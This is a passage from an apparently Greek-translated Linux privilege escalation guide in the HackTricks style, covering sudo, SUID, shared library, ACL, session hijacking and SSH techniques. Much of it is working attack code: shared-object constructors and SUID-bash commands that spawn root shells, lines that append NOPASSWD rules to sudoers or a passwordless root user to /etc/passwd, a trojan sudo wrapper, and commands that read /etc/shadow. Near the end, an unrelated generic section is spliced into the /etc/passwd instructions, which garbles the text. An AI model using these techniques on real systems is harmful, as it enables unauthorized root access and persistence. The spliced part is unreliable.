```
Terraform θα αποτύχει στο Go plugin handshake αλλά εκτελεί το payload ως root πριν πεθάνει, αφήνοντας πίσω ένα SUID shell.

### TF_VAR overrides + symlink validation bypass

Οι Terraform variables μπορούν να δοθούν μέσω των `TF_VAR_<name>` environment variables, τα οποία επιβιώνουν όταν το sudo διατηρεί το environment. Αδύναμες validations όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` μπορούν να παρακαμφθούν με symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Το Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό που μπορεί να διαβαστεί από τον επιτιθέμενο. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για να **γράψετε** σε privileged paths, δημιουργώντας εκ των προτέρων destination symlinks (π.χ. δείχνοντας το destination path του provider μέσα στο `/etc/cron.d/`).

### requiretty / !requiretty

Σε ορισμένες παλαιότερες διανομές, το sudo μπορεί να ρυθμιστεί με `requiretty`, το οποίο εξαναγκάζει το sudo να εκτελείται μόνο από ένα διαδραστικό TTY. Αν έχει οριστεί `!requiretty` (ή αν η επιλογή απουσιάζει), το sudo μπορεί να εκτελεστεί από non-interactive contexts όπως reverse shells, cron jobs, ή scripts.
```bash
Defaults !requiretty
```
Αυτό δεν είναι από μόνο του άμεσο vulnerability, αλλά επεκτείνει τις περιπτώσεις όπου τα sudo rules μπορούν να abused χωρίς να χρειάζεται πλήρες PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Αν το `sudo -l` δείχνει `env_keep+=PATH` ή ένα `secure_path` που περιέχει entries που μπορούν να γραφτούν από attacker (π.χ. `/home/<user>/bin`), οποιοδήποτε relative command μέσα στο sudo-allowed target μπορεί να shadowed.

- Requirements: ένα sudo rule (συχνά `NOPASSWD`) που τρέχει ένα script/binary το οποίο καλεί commands χωρίς absolute paths (`free`, `df`, `ps`, κ.λπ.) και ένα writable PATH entry που searched first.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Παράκαμψη διαδρομών εκτέλεσης με sudo
**Jump** για να διαβάσεις άλλα αρχεία ή να χρησιμοποιήσεις **symlinks**. Για παράδειγμα, στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί ένα **wildcard** (\*), είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Εντολή Sudo/SUID binary χωρίς command path

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= (root) less_ you can exploit it by changing the PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί μια άλλη εντολή χωρίς να καθορίζει το path προς αυτήν (πάντα έλεγξε με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**.

[Παραδείγματα payloads προς εκτέλεση.](payloads-to-execute.md)

### SUID binary with command path

Αν το **suid** binary **εκτελεί μια άλλη εντολή καθορίζοντας το path**, τότε μπορείς να δοκιμάσεις να **export a function** με όνομα όπως η εντολή που καλεί το suid file.

Για παράδειγμα, αν ένα suid binary καλεί _**/usr/sbin/service apache2 start**_ πρέπει να δοκιμάσεις να δημιουργήσεις τη function και να την export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### Εκτελέσιμο writable script από ένα SUID wrapper

Μια συνηθισμένη misconfiguration σε custom-app είναι ένα root-owned SUID binary wrapper που εκτελεί ένα script, ενώ το ίδιο το script είναι writable από low-priv users.

Τυπικό pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Αν το `/usr/local/bin/backup.sh` είναι writable, μπορείς να προσθέσεις payload commands και μετά να εκτελέσεις το SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Γρήγοροι έλεγχοι:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Αυτό το attack path είναι ιδιαίτερα συνηθισμένο σε "maintenance"/"backup" wrappers που διανέμονται στο `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so files) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας library.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ιδιαίτερα με **suid/sgid** executables, το σύστημα επιβάλλει ορισμένες συνθήκες:

- Ο loader αγνοεί το **LD_PRELOAD** για executables όπου το real user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για executables με suid/sgid, preload γίνονται μόνο libraries σε standard paths που είναι επίσης suid/sgid.

Privilege escalation μπορεί να συμβεί αν έχεις τη δυνατότητα να εκτελείς commands με `sudo` και το output του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμα και όταν commands εκτελούνται με `sudo`, οδηγώντας ενδεχομένως στην εκτέλεση αυθαίρετου code με elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθήκευση ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Τότε **συνόψισέ το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τελικά, **escalate privileges** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ένα παρόμοιο privesc μπορεί να καταχραστεί αν ο attacker ελέγχει τη μεταβλητή περιβάλλοντος **LD_LIBRARY_PATH** επειδή ελέγχει το path όπου θα αναζητηθούν οι libraries.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν συναντάτε ένα binary με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύσετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει μια πιθανή δυνατότητα exploitation.

Για να το exploit αυτό, θα προχωρούσε κανείς δημιουργώντας ένα C file, π.χ. _"/path/to/.config/libcalc.c"_, που να περιέχει τον ακόλουθο code:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στην κλιμάκωση δικαιωμάτων μέσω χειρισμού των δικαιωμάτων αρχείων και εκτέλεσης ενός shell με αυξημένα δικαιώματα.

Μεταγλώττισε το παραπάνω C αρχείο σε ένα shared object (.so) αρχείο με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεαζόμενου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας ενδεχόμενο system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που βρήκαμε ένα SUID binary που φορτώνει μια library από έναν φάκελο στον οποίο μπορούμε να γράψουμε, ας δημιουργήσουμε τη library σε εκείνο τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Αν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα από Unix binaries που μπορούν να εκμεταλλευτούν από έναν attacker για να παρακάμψουν τοπικούς περιορισμούς ασφάλειας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείς **μόνο να κάνεις inject arguments** σε μια command.

Το project συλλέγει νόμιμες functions από Unix binaries που μπορούν να abused για να ξεφύγουν από restricted shells, να escalate ή να διατηρήσουν elevated privileges, να μεταφέρουν files, να κάνουν spawn bind και reverse shells, και να διευκολύνουν τις άλλες post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Αν μπορείς να έχεις πρόσβαση στο `sudo -l` μπορείς να χρησιμοποιήσεις το tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξεις αν βρίσκει πώς να exploit οποιονδήποτε sudo rule.

### Reusing Sudo Tokens

Σε περιπτώσεις όπου έχεις **sudo access** αλλά όχι τον password, μπορείς να escalate privileges **περιμένοντας την εκτέλεση ενός sudo command και μετά hijacking το session token**.

Requirements to escalate privileges:

- Έχεις ήδη ένα shell ως user "_sampleuser_"
- Ο "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15mins** (by default αυτή είναι η διάρκεια του sudo token που επιτρέπει να χρησιμοποιήσουμε `sudo` χωρίς να εισαγάγουμε password)
- `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
- το `gdb` είναι accessible (μπορείς να το ανεβάσεις)

(Μπορείς προσωρινά να ενεργοποιήσεις το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας το `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας `kernel.yama.ptrace_scope = 0`)

Αν όλα αυτά τα requirements ικανοποιούνται, **μπορείς να escalate privileges χρησιμοποιώντας:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείς να το χρησιμοποιήσεις για να **activate το sudo token στο session σου** (δεν θα πάρεις αυτόματα root shell, κάνε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **ιδιοκτησία του root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα αρχείο sudoers** που κάνει τα **sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Αν έχετε **write permissions** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που έχουν δημιουργηθεί μέσα στον φάκελο, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **create a sudo token for a user and PID**.\
Για παράδειγμα, αν μπορείτε να overwrite το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως αυτός ο user με PID 1234, μπορείτε να **obtain sudo privileges** χωρίς να χρειάζεται να ξέρετε το password κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιεί `sudo` και πώς. Αυτά τα αρχεία **by default μπορούν να διαβαστούν μόνο από τον user root και το group root**.\
**If** μπορείς να **read** αυτό το αρχείο, θα μπορούσες να **obtain some interesting information**, και αν μπορείς να **write** οποιοδήποτε αρχείο, θα μπορέσεις να **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να abuse this permission
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος να καταχραστείς αυτά τα permissions:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν ορισμένες εναλλακτικές του `sudo` binary όπως το `doas` για OpenBSD, να θυμάστε να ελέγχετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Hijacking του Sudo

Αν ξέρεις ότι ένας **user συνήθως συνδέεται σε ένα machine και χρησιμοποιεί `sudo`** για να κάνει escalate privileges και έχεις πάρει ένα shell μέσα σε αυτό το user context, μπορείς να **δημιουργήσεις ένα νέο sudo executable** που θα εκτελεί τον κώδικά σου ως root και μετά την εντολή του user. Έπειτα, **τροποποίησε το $PATH** του user context (για παράδειγμα προσθέτοντας το νέο path στο .bash_profile) ώστε όταν ο user εκτελεί sudo, να εκτελείται το δικό σου sudo executable.

Σημείωσε ότι αν ο user χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσεις άλλα files για να προσθέσεις το νέο path. Για παράδειγμα το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείς να βρεις ένα άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή τρέχοντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα φορτωμένα configuration files**. Συνήθως, αυτό το αρχείο περιέχει το ακόλουθο path: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα configuration files από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα configuration files **δείχνουν σε άλλους φακέλους** όπου οι **libraries** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει libraries μέσα στο `/usr/local/lib`**.

Αν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιοδήποτε από τα paths που υποδεικνύονται: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο μέσα στο configuration file στο `/etc/ld.so.conf.d/*.conf`, μπορεί να είναι σε θέση να κάνει privilege escalation.\
Δες **πώς να εκμεταλλευτείς αυτήν τη misconfiguration** στην ακόλουθη σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αντιγράφοντας το lib στο `/var/tmp/flag15/` θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως ορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Τα Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων root privileges σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα root **privileges σε μικρότερες και ξεχωριστές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να αποδοθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο, το πλήρες σύνολο privileges μειώνεται, μειώνοντας τους κινδύνους exploitation.\
Διάβασε την παρακάτω σελίδα για να **μάθεις περισσότερα για τα capabilities και πώς να τα abuse**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Σε ένα directory, το **bit για "execute"** σημαίνει ότι ο χρήστης που επηρεάζεται μπορεί να κάνει "**cd**" μέσα στον φάκελο.\
Το **"read"** bit σημαίνει ότι ο χρήστης μπορεί να **list** τα **files**, και το **"write"** bit σημαίνει ότι ο χρήστης μπορεί να **delete** και να **create** νέα **files**.

## ACLs

Τα Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο discretionary permissions, ικανά να **υπερισχύουν των παραδοσιακών ugo/rwx permissions**. Αυτά τα permissions ενισχύουν τον έλεγχο πρόσβασης σε αρχείο ή directory, επιτρέποντας ή απορρίπτοντας δικαιώματα σε συγκεκριμένους users που δεν είναι οι owners ή μέλος του group. Αυτό το επίπεδο **granularity εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λάβε** αρχεία με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Κρυφή ACL backdoor σε sudoers drop-ins

Μια συνηθισμένη λανθασμένη ρύθμιση είναι ένα αρχείο owned by root στο `/etc/sudoers.d/` με mode `440` που εξακολουθεί να δίνει write access σε έναν low-priv user μέσω ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Αν δεις κάτι σαν `user:alice:rw-`, ο χρήστης μπορεί να προσθέσει έναν sudo rule παρότι τα restrictive mode bits:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Αυτό είναι μια διαδρομή ACL persistence/privesc υψηλού αντίκτυπου, επειδή είναι εύκολο να περάσει απαρατήρητη σε ελέγχους μόνο με `ls -l`.

## Open shell sessions

Σε **παλιές εκδόσεις** μπορείτε να **hijack** κάποια **shell** session διαφορετικού χρήστη (**root**).\
Στις **νεότερες εκδόσεις** θα μπορείτε να **connect** σε screen sessions μόνο του **δικού σας χρήστη**. Ωστόσο, μπορεί να βρείτε **interesting information inside the session**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Σύνδεση σε μια session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## hijacking συνεδριών tmux

Αυτό ήταν ένα πρόβλημα με **παλιές εκδόσεις tmux**. Δεν κατάφερα να hijack μια συνεδρία tmux (v2.1) που δημιουργήθηκε από root ως μη-προνομιούχος χρήστης.

**Λίστα συνεδριών tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Σύνδεση σε μια session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Αυτό το bug προκαλείται κατά τη δημιουργία ενός νέου ssh key σε αυτά τα OS, καθώς **μόνο 32,768 παραλλαγές ήταν δυνατές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείς να αναζητήσεις το αντίστοιχο private key**. Μπορείς να βρεις τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται η password authentication. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται η public key authentication. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν επιτρέπεται η password authentication, καθορίζει αν ο server επιτρέπει login σε accounts με κενό password string. Η προεπιλογή είναι `no`.

### Login control files

Αυτά τα files επηρεάζουν ποιος μπορεί να κάνει login και πώς:

- **`/etc/nologin`**: αν υπάρχει, μπλοκάρει non-root logins και εμφανίζει το μήνυμά του.
- **`/etc/securetty`**: περιορίζει από πού μπορεί να κάνει login το root (TTY allowlist).
- **`/etc/motd`**: post-login banner (μπορεί να leak environment or maintenance details).

### PermitRootLogin

Καθορίζει αν το root μπορεί να κάνει login μέσω ssh, η προεπιλογή είναι `no`. Πιθανές τιμές:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Καθορίζει files που περιέχουν τα public keys που μπορούν να χρησιμοποιηθούν για user authentication. Μπορεί να περιέχει tokens όπως `%h`, τα οποία θα αντικατασταθούν από το home directory. **Μπορείς να ορίσεις absolute paths** (ξεκινώντας σε `/`) ή **relative paths from the user's home**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η διαμόρφωση θα δείξει ότι αν προσπαθήσεις να συνδεθείς με το **private** key του χρήστη "**testusername**" το ssh θα συγκρίνει το public key του key σου με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Το SSH agent forwarding σου επιτρέπει να **χρησιμοποιείς τα local SSH keys σου αντί να αφήνεις keys** (χωρίς passphrases!) αποθηκευμένα στον server σου. Έτσι, θα μπορείς να **jump** μέσω ssh **σε έναν host** και από εκεί να **jump σε έναν άλλο** host **χρησιμοποιώντας** το **key** που βρίσκεται στον **αρχικό σου host**.

Πρέπει να ορίσεις αυτή την επιλογή στο `$HOME/.ssh.config` έτσι:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

Το αρχείο `/etc/ssh_config` μπορεί να **υπερκαλύψει** αυτές τις **options** και να επιτρέψει ή να αρνηθεί αυτή τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **αρνηθεί** ssh-agent forwarding με τη λέξη-κλειδί `AllowAgentForwarding` (το default είναι allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Τα αρχεία `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας user ανοίγει ένα νέο shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **ευαίσθητες λεπτομέρειες**.

### Passwd/Shadow Files

Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **find all of them** and **check if you can read** them to see **if there are hashes** inside the files:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή το αντίστοιχο)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιουργήστε έναν κωδικό πρόσβασης με μία από τις ακόλουθες εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
## Αύξηση Δικαιωμάτων

Ανάλογα με τη δυνατότητα για root χρήστη, θα υπάρχει ένα διαφορετικό επίθετο που θα μπορούσε να χρησιμοποιηθεί.

### Βασικές Ιδέες

Το privilege escalation βασίζεται σε:
- Misconfigurations
- Vulnerabilities
- Εκμετάλλευση τρωτών υπηρεσιών
- Χρήση ευαίσθητων δεδομένων που έχουν διαρρεύσει

### Συνήθεις Έλεγχοι

Ελέγξτε για:
- SUID binaries
- sudo permissions
- Cron jobs
- Writable files
- Capabilities
- Kernel exploits

### Χρήσιμοι Πόροι

Δείτε επίσης:
- [generic-methodologies-and-resources/pentesting-methodology.md](generic-methodologies-and-resources/pentesting-methodology.md)
- [lamda-post-exploitation.md](lamda-post-exploitation.md)

### Παράδειγμα

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

### Σημείωση

Μην ξεχνάτε να ελέγχετε για `leak`, default credentials και weak passwords.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείς τώρα να χρησιμοποιήσεις την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείς να χρησιμοποιήσεις τις παρακάτω γραμμές για να προσθέσεις έναν dummy user χωρίς password.\
WARNING: ενδέχεται να υποβαθμίσεις την τρέχουσα ασφάλεια του μηχανήματος.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: Σε πλατφόρμες BSD το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάζεται σε `/etc/spwd.db`.

